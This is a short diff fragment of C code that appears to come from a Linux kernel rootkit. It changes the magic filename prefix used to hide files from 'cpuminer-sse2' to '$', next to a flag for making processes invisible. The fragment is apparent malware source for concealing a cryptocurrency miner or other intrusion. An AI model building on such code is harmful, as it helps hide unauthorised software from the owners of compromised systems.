@@ -5,7 +5,7 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "cpuminer-sse2"
+#define MAGIC_PREFIX "$"
 #define PF_INVISIBLE 0x10000000
 
 enum {
